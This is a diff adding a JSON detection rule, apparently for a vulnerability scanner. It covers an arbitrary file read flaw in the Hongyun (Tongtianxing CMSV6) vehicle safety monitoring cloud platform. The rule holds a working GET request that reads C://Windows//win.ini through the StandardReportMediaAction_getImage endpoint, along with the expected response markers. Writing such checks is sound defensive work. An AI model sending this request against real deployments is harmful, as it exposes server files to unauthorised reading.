@@ -1,0 +1,24 @@
+{
+    "vul_name": "鸿运(通天星CMSV6车载)主动安全监控云平台存在任意文件读取漏洞",
+    "level": "中危",
+    "description": "鸿运主动安全监控云平台实现对计算资源、存储资源、网络资源、云应用服务进行7*24小时全时区、多地域、全方位、立体式、智能化的IT运维监控，保障IT系统安全、稳定、可靠运行。鸿运主动安全监控云平台StandardReportMediaAction_getImage存在任意文件读取漏洞，攻击者可利用该漏洞读取系统敏感文件。",
+    "product": "鸿运(通天星CMSV6车载)主动安全监控云平台",
+    "version": "鸿运(通天星CMSV6车载)主动安全监控云平台",
+    "cve": "无",
+    "reference": "https://mp.weixin.qq.com/s/7zORAmffAGKprFn7GAIleA",
+    "fixing": "联系厂商更新补丁",
+    "rule": {
+        "path": "/808gps/StandardReportMediaAction_getImage.action?filePath=C://Windows//win.ini&fileOffset=1&fileSize=100",
+        "method": "GET",
+        "headers": "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)\r\nAccept: */*\r\nConnection: Keep-Alive",
+        "body": "",
+        "status_code": "200",
+        "keywords": "files;Mail",
+        "res_time": ""
+    },
+    "operator": {
+        "author": "浪飒",
+        "email": "langsa-hy@qq.com",
+        "github": "https://github.com/langsasec"
+    }
+}
